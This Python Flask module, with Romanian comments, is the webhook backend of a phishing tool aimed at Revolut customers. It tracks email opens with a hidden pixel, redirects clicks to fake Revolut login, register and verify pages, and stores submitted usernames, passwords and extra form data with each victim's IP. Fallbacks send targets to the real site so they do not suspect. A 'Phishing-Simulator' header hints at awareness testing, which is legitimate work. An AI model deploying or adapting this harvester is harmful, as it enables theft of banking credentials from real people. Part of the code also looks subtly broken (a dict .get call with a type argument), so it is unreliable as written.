import logging
from flask import Blueprint, request, jsonify, Response, redirect, url_for
from datetime import datetime
import base64

from services.tracking_service import TrackingService
from services.credential_capture import CredentialCaptureService
from utils.helpers import get_client_ip, log_security_event
from utils.validators import ValidationError


# Crearea Blueprint-ului pentru webhook endpoints
bp = Blueprint('webhook', __name__, url_prefix='/webhook')

# Inițializează serviciile
tracking_service = TrackingService()
credential_service = CredentialCaptureService()
logger = logging.getLogger(__name__)


@bp.route('/pixel.gif')
def tracking_pixel():
    """
    Tracking pixel pentru deschiderea email-urilor
    
    Query parameters:
    - c: campaign_id
    - t: target_id  
    - token: tracking_token (opțional)
    
    Returns:
        Response: 1x1 transparent GIF
    """
    try:
        # Extrage parametrii
        campaign_id = request.args.get('c', type=int)
        target_id = request.args.get('t', type=int)
        tracking_token = request.args.get('token')
        
        if not campaign_id or not target_id:
            logger.warning(f"Tracking pixel accessed with invalid params: c={campaign_id}, t={target_id}")
            return _return_tracking_pixel()
        
        # Trackează deschiderea email-ului
        tracking_service.track_email_open(
            campaign_id=campaign_id,
            target_id=target_id,
            tracking_token=tracking_token
        )
        
        logger.info(f"Email open tracked: Campaign {campaign_id}, Target {target_id}")
        
        # Returnează pixel transparent
        return _return_tracking_pixel()
        
    except Exception as e:
        logger.error(f"Error in tracking pixel: {str(e)}")
        # Returnează pixel chiar și în caz de eroare (să nu suspecteze)
        return _return_tracking_pixel()


@bp.route('/click')
def track_click():
    """
    Endpoint pentru tracking click-uri pe link-uri din email
    
    Query parameters:
    - c: campaign_id
    - t: target_id
    - url: destination_url (opțional)
    - token: tracking_token (opțional)
    
    Returns:
        Redirect: Către site-ul fake sau URL specificat
    """
    try:
        # Extrage parametrii
        campaign_id = request.args.get('c', type=int)
        target_id = request.args.get('t', type=int)
        destination_url = request.args.get('url')
        tracking_token = request.args.get('token')
        
        if not campaign_id or not target_id:
            logger.warning(f"Click tracking accessed with invalid params: c={campaign_id}, t={target_id}")
            # Redirect la pagina principală dacă parametrii sunt invalizi
            return redirect('https://revolut.com')
        
        # Trackează click-ul
        tracking_event, redirect_url = tracking_service.track_link_click(
            campaign_id=campaign_id,
            target_id=target_id,
            destination_url=destination_url,
            tracking_token=tracking_token
        )
        
        logger.info(f"Link click tracked: Campaign {campaign_id}, Target {target_id}")
        
        # Redirect către site-ul fake
        return redirect(redirect_url)
        
    except Exception as e:
        logger.error(f"Error in click tracking: {str(e)}")
        # Redirect la site-ul real în caz de eroare
        return redirect('https://revolut.com')


@bp.route('/page')
def track_page_visit():
    """
    Endpoint pentru tracking vizitarea paginilor din site-ul fake
    
    Query parameters:
    - c: campaign_id
    - t: target_id
    - page: page_url
    - token: tracking_token (opțional)
    
    Returns:
        JSON: Status tracking
    """
    try:
        # Extrage parametrii
        campaign_id = request.args.get('c', type=int)
        target_id = request.args.get('t', type=int)
        page_url = request.args.get('page', request.referrer or 'unknown')
        tracking_token = request.args.get('token')
        
        if not campaign_id or not target_id:
            return jsonify({'error': 'Invalid parameters'}), 400
        
        # Trackează vizita
        tracking_service.track_page_visit(
            campaign_id=campaign_id,
            target_id=target_id,
            page_url=page_url,
            tracking_token=tracking_token
        )
        
        logger.debug(f"Page visit tracked: {page_url} for Target {target_id}")
        
        return jsonify({
            'status': 'tracked',
            'page': page_url,
            'timestamp': datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error tracking page visit: {str(e)}")
        return jsonify({'error': 'Tracking failed'}), 500


@bp.route('/form_view')
def track_form_view():
    """
    Endpoint pentru tracking vizualizarea formularelor
    
    Query parameters:
    - c: campaign_id
    - t: target_id
    - form: form_type (login, register, verify)
    - token: tracking_token (opțional)
    
    Returns:
        JSON: Status tracking
    """
    try:
        # Extrage parametrii
        campaign_id = request.args.get('c', type=int)
        target_id = request.args.get('t', type=int)
        form_type = request.args.get('form', 'login')
        tracking_token = request.args.get('token')
        
        if not campaign_id or not target_id:
            return jsonify({'error': 'Invalid parameters'}), 400
        
        # Trackează vizualizarea formularului
        tracking_service.track_form_view(
            campaign_id=campaign_id,
            target_id=target_id,
            form_type=form_type,
            tracking_token=tracking_token
        )
        
        logger.debug(f"Form view tracked: {form_type} for Target {target_id}")
        
        return jsonify({
            'status': 'tracked',
            'form_type': form_type,
            'timestamp': datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error tracking form view: {str(e)}")
        return jsonify({'error': 'Tracking failed'}), 500


@bp.route('/credentials', methods=['POST'])
def capture_credentials():
    """
    Endpoint pentru capturarea credențialelor din formulare
    
    JSON payload sau form data:
    - c: campaign_id
    - t: target_id
    - username: username
    - password: password
    - token: tracking_token (opțional)
    - additional_data: date suplimentare (opțional)
    
    Returns:
        JSON: Rezultatul capturării (fără date sensibile)
    """
    try:
        # Extrage datele din request (JSON sau form data)
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
        
        # Parametrii obligatorii
        campaign_id = data.get('c', type=int) or data.get('campaign_id', type=int)
        target_id = data.get('t', type=int) or data.get('target_id', type=int)
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()
        tracking_token = data.get('token') or data.get('tracking_token')
        
        if not all([campaign_id, target_id, username, password]):
            return jsonify({
                'error': 'Missing required parameters',
                'required': ['campaign_id', 'target_id', 'username', 'password']
            }), 400
        
        # Date suplimentare din formular
        additional_data = {}
        exclude_fields = {'c', 't', 'campaign_id', 'target_id', 'username', 'password', 'token', 'tracking_token'}
        
        for key, value in data.items():
            if key not in exclude_fields and value:
                additional_data[key] = value
        
        # Metadata sesiune
        session_data = {
            'ip_address': get_client_ip(),
            'user_agent': request.headers.get('User-Agent', ''),
            'referrer': request.headers.get('Referer', ''),
            'timestamp': datetime.utcnow().isoformat(),
            'request_method': request.method,
            'content_type': request.content_type
        }
        
        # Capturează credențialele
        result = credential_service.capture_credentials(
            campaign_id=campaign_id,
            target_id=target_id,
            username=username,
            password=password,
            additional_data=additional_data,
            tracking_token=tracking_token,
            session_data=session_data
        )
        
        # Pregătește răspunsul (fără date sensibile)
        safe_response = {
            'status': 'captured',
            'credential_id': result['credential_id'],
            'timestamp': datetime.utcnow().isoformat(),
            'analysis': {
                'password_strength': result['analysis']['password_strength'],
                'risk_score': result['analysis']['risk_score'],
                'is_duplicate': result['is_duplicate']
            },
            'recommendations': result['recommendations'][:3]  # Doar primele 3
        }
        
        logger.info(f"Credentials captured via webhook: Campaign {campaign_id}, Target {target_id}")
        log_security_event('credentials_captured_webhook', f"Credentials captured for target {target_id}")
        
        return jsonify(safe_response)
        
    except ValidationError as e:
        logger.warning(f"Validation error in credential capture: {str(e)}")
        return jsonify({'error': str(e)}), 400
        
    except Exception as e:
        logger.error(f"Error capturing credentials via webhook: {str(e)}")
        return jsonify({'error': 'Credential capture failed'}), 500


@bp.route('/redirect')
def smart_redirect():
    """
    Endpoint pentru redirect-uri inteligente (de la link-uri scurte)
    
    Query parameters:
    - c: campaign_id
    - t: target_id
    - dest: destination (login, register, verify, external)
    - url: custom URL (opțional)
    - token: tracking_token (opțional)
    
    Returns:
        Redirect: Către destinația specificată
    """
    try:
        # Extrage parametrii
        campaign_id = request.args.get('c', type=int)
        target_id = request.args.get('t', type=int)
        destination = request.args.get('dest', 'login')
        custom_url = request.args.get('url')
        tracking_token = request.args.get('token')
        
        if not campaign_id or not target_id:
            logger.warning(f"Smart redirect with invalid params: c={campaign_id}, t={target_id}")
            return redirect('https://revolut.com')
        
        # Trackează click-ul
        tracking_service.track_link_click(
            campaign_id=campaign_id,
            target_id=target_id,
            tracking_token=tracking_token
        )
        
        # Determină URL-ul de destinație
        if custom_url:
            redirect_url = custom_url
        elif destination == 'login':
            redirect_url = f"/revolut/login?c={campaign_id}&t={target_id}&token={tracking_token}"
        elif destination == 'register':
            redirect_url = f"/revolut/register?c={campaign_id}&t={target_id}&token={tracking_token}"
        elif destination == 'verify':
            redirect_url = f"/revolut/verify?c={campaign_id}&t={target_id}&token={tracking_token}"
        elif destination == 'external':
            redirect_url = 'https://revolut.com'
        else:
            redirect_url = f"/revolut/login?c={campaign_id}&t={target_id}&token={tracking_token}"
        
        logger.info(f"Smart redirect: Target {target_id} → {destination}")
        
        return redirect(redirect_url)
        
    except Exception as e:
        logger.error(f"Error in smart redirect: {str(e)}")
        return redirect('https://revolut.com')


@bp.route('/stats')
def webhook_stats():
    """
    Endpoint pentru statistici despre webhook-uri (pentru debugging)
    
    Returns:
        JSON: Statistici despre tracking
    """
    try:
        # Statistici simple pentru ultimele 24h
        from models.tracking import Tracking
        from sqlalchemy import func
        from datetime import timedelta
        
        yesterday = datetime.utcnow() - timedelta(days=1)
        
        stats = {
            'last_24h': {
                'total_events': Tracking.query.filter(Tracking.timestamp >= yesterday).count(),
                'email_opens': Tracking.query.filter(
                    Tracking.timestamp >= yesterday,
                    Tracking.event_type == 'email_opened'
                ).count(),
                'link_clicks': Tracking.query.filter(
                    Tracking.timestamp >= yesterday,
                    Tracking.event_type == 'link_clicked'
                ).count(),
                'credentials_captured': Tracking.query.filter(
                    Tracking.timestamp >= yesterday,
                    Tracking.event_type == 'credentials_entered'
                ).count()
            },
            'top_campaigns': [],  # TODO: implementează dacă e necesar
            'server_info': {
                'timestamp': datetime.utcnow().isoformat(),
                'client_ip': get_client_ip(),
                'user_agent': request.headers.get('User-Agent', '')
            }
        }
        
        return jsonify(stats)
        
    except Exception as e:
        logger.error(f"Error getting webhook stats: {str(e)}")
        return jsonify({'error': 'Stats unavailable'}), 500


# === HELPER FUNCTIONS ===

def _return_tracking_pixel():
    """
    Returnează un pixel de tracking transparent (1x1 GIF)
    
    Returns:
        Response: GIF transparent
    """
    # 1x1 transparent GIF în base64
    pixel_data = base64.b64decode(
        'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'
    )
    
    response = Response(pixel_data, mimetype='image/gif')
    
    # Headers pentru cache și tracking
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    response.headers['Content-Length'] = str(len(pixel_data))
    
    return response


# === ERROR HANDLERS ===

@bp.errorhandler(400)
def webhook_bad_request(error):
    """Handler pentru erori 400 în webhook-uri"""
    logger.warning(f"Webhook bad request: {error}")
    return jsonify({'error': 'Bad request'}), 400


@bp.errorhandler(500)
def webhook_internal_error(error):
    """Handler pentru erori 500 în webhook-uri"""
    logger.error(f"Webhook internal error: {error}")
    return jsonify({'error': 'Internal server error'}), 500


# === SECURITY MIDDLEWARE ===

@bp.before_request
def webhook_security():
    """
    Security middleware pentru webhook-uri
    """
    # Log toate request-urile pentru audit
    if not request.endpoint or not request.endpoint.endswith('webhook_stats'):
        logger.info(f"Webhook request: {request.method} {request.path} from {get_client_ip()}")
    
    # Rate limiting simplu (poți îmbunătăți cu Redis)
    # TODO: implementează rate limiting avansat dacă e necesar
    
    # Verifică User-Agent suspiciós
    user_agent = request.headers.get('User-Agent', '').lower()
    suspicious_agents = ['bot', 'crawler', 'spider', 'scraper']
    
    if any(agent in user_agent for agent in suspicious_agents):
        logger.warning(f"Suspicious User-Agent in webhook: {user_agent}")
        # Nu blochează, doar loggează


@bp.after_request
def webhook_response_headers(response):
    """
    Adaugă headers la răspunsurile webhook-urilor
    """
    # Headers pentru tracking pixel (să nu fie cached)
    if request.endpoint and 'pixel' in request.endpoint:
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['X-Robots-Tag'] = 'noindex, nofollow'
    
    # Headers generale pentru API
    if request.path.startswith('/webhook/'):
        response.headers['X-Powered-By'] = 'Phishing-Simulator'
    
    return response